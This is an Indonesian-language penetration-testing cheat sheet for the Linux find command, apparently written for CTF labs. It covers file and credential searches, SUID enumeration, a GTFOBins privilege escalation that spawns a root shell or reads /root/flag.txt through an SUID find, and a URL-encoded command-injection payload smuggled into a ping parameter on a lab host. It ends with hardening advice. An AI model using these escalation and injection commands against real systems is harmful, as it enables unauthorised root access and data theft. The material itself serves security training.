# Find Penetration Testing & Command Cheat Sheet

> **Tujuan:** Panduan lengkap pencarian berkas di Linux, teknik enumerasi SUID, serta eksploitasi binary `find` dengan SUID bit (GTFOBins) untuk pembacaan berkas flag / eskalasi hak akses dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `find`, `grep`, `locate`

---

## Penjelasan Singkat

| Item | Detail |
|------|--------|
| **Fungsi** | Pencarian berkas & direktori berdasarkan nama, tipe, ukuran, permission, dan waktu |
| **Sintaks Dasar** | `find <path> <opsi> <aksi>` |
| **Eksploitasi SUID** | `find <file> -exec <command> {} \;` (via [GTFOBins](https://gtfobins.github.io/gtfobins/find/)) |

---

## Langkah 1: Mencari Berkas di Linux (Pencarian Dasar)

### 1. Mencari Berkas Berdasarkan Nama

```bash
# Cari berkas bernama tepat "flag.txt" dari root direktori
find / -name "flag.txt"

# Cari berkas tanpa peduli huruf besar/kecil (case-insensitive)
find / -iname "flag.txt"

# Cari semua berkas yang mengandung kata "flag" (flag.txt, flag_old.txt, dll)
find / -iname "*flag*"

# Cari berkas umum di CTF/pentest lab (user.txt & root.txt)
find / -iname "user.txt" -o -iname "root.txt" -o -iname "flag.txt"
```

> **Catatan:** Beda `find /` dan `find .` —
> - **`find /`** melakukan pencarian mulai dari **root direktori (/)** sehingga mencakup **seluruh berkas di sistem**, cocok digunakan saat sudah mendapatkan shell interaktif di server (contoh hasil: `./root/flag.txt`).
> - **`find .`** melakukan pencarian mulai dari **direktori posisi shell saat ini**, lebih cepat karena cakupannya terbatas, cocok digunakan saat injeksi perintah lewat web (Command Injection) karena direktori kerja biasanya berada di web root aplikasi.

---

### 2. Mencari Berkas Berdasarkan Tipe & Ukuran

```bash
# Cari hanya berkas (bukan direktori)
find / -type f -iname "flag.txt"

# Cari direktori tertentu
find / -type d -iname "backup"

# Cari berkas dengan ukuran lebih besar dari 50 MB (potensi dump/backup database)
find / -type f -size +50M

# Cari berkas kosong (0 byte)
find / -type f -size 0
```

---

### 3. Mencari Berkas Berdasarkan Permission (SUID/SGID)

```bash
# Cari semua berkas dengan SUID bit (pemilik berjalannya sebagai root)
find / -perm -4000 -type f 2>/dev/null

# Cari semua berkas dengan SGID bit
find / -perm -2000 -type f 2>/dev/null

# Cari berkas SUID/SGID sekaligus
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

# Cari berkas yang writable oleh siapapun (berbahaya)
find / -writable -type f 2>/dev/null

# Cek binary apa saja yang boleh dijalankan dengan sudo
sudo -l
```

---

### 4. Mencari Isi Berkas Berdasarkan String (grep)

```bash
# Cari string "password" di seluruh berkas dalam direktori
grep -rni "password" /var/www/html/

# Cari format flag (flag{...} atau CTF{...}) di dalam berkas
grep -rni "flag{" / 2>/dev/null
grep -rni "CTF{" /opt 2>/dev/null

# Cari kredensial umum di berkas konfigurasi web
grep -rniE "(db_|jdbc:|password ?=|secret)" /var/www/ 2>/dev/null
```

---

## Langkah 2: Eksploitasi SUID `find` (GTFOBins)

### 1. Identifikasi Binary `find` dengan SUID Bit

```bash
# Enumerasi berkas SUID — perhatikan jika /usr/bin/find muncul
find / -perm -4000 -type f 2>/dev/null

# Verifikasi permission & pemilik binary find
ls -la /usr/bin/find
# Output: -rwsr-xr-x 1 root root ... /usr/bin/find
#         ^ bit "s" menandakan SUID (berjalan sebagai root)
```

---

### 2. Eksekusi Perintah Sebagai Root Menggunakan `find`

```bash
# Eksekusi perintah "id" sebagai root (normal shell)
find . -name "sesuatu" -exec id \;

# Mendapatkan shell root interaktif
find . -name "sesuatu" -exec /bin/sh \;

# Jalankan binary find langsung sebagai root (SUID)
/usr/bin/find . -name "sesuatu" -exec whoami \;
# Output: root
```

---

### 3. Pencarian Flag Setelah Ditemukan SUID `/usr/bin/find`

Setelah ada SUID `/usr/bin/find`, pencarian flag dilakukan dengan perintah:

```bash
/usr/bin/find / -iname "flag.txt"
# Flag ditemukan pada direktori ./root/flag.txt
```

Baca isi berkas flag menggunakan opsi `-exec cat` pada binary SUID find:

```bash
/usr/bin/find /root/flag.txt -exec cat {} \;
```

```bash
/usr/bin/find /root/flag.txt -exec cat {} +
```

> **Catatan:** Pada payload berbasis web (Command Injection / RCE), simbol `+` atau `\;` pada akhir perintah sering disanitasi oleh aplikasi. Lakukan **URL encode** pada simbol tersebut agar tidak tersanitasi, contoh `+` menjadi `%2B`:

```http
GET /api/tools/ping?target=127.0.0.1%7C/usr/bin/find+/root/flag.txt+-exec+cat+{}+%2B HTTP/1.1
Host: jobportal.vulnapp.id
```

```bash
# Versi CLI (curl) dengan URL encoding %2B
curl -G "http://jobportal.vulnapp.id/api/tools/ping" --data-urlencode "target=127.0.0.1|/usr/bin/find /root/flag.txt -exec cat {} +"
```

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **Audit Binary SUID** Lakukan audit rutin terhadap seluruh binary SUID/SGID (`find / -perm -4000`) dan hapus bit SUID pada binary yang tidak membutuhkan privilege root.
- **Gunakan Allowlist SUID** Batasi binary yang boleh memiliki SUID hanya pada yang benar-benar diperlukan (seperti `passwd`, `sudo`, `su`).
- **Kunci Direktori Root** Pastikan berkas flag / data sensitif berada pada direktori dengan permission ketat (`chmod 700 /root`).
- **Sanitasi Input Aplikasi** Terapkan allowlist karakter pada parameter input aplikasi web agar perintah injeksi seperti `find -exec` tidak dapat dieksekusi.

---

## Checklist Penetration Testing Find

- [ ] Cari berkas sensitif dengan nama umum (`flag.txt`, `user.txt`, `root.txt`, `.env`, `backup`)
- [ ] Enumerasi binary SUID/SGID (`find / -perm -4000 -type f 2>/dev/null`)
- [ ] Verifikasi binary `find` milik root dengan bit SUID (`ls -la /usr/bin/find`)
- [ ] Uji eksekusi perintah via `find <file> -exec <command> \;` (GTFOBins)
- [ ] Pencarian & pembacaan flag via `/usr/bin/find / -iname "flag.txt"` dan `-exec cat {} \;`
- [ ] Gunakan URL encode (`%2B`, `%3B`) pada payload web agar simbol tidak tersanitasi
- [ ] Dokumentasikan temuan dan langkah mitigasi
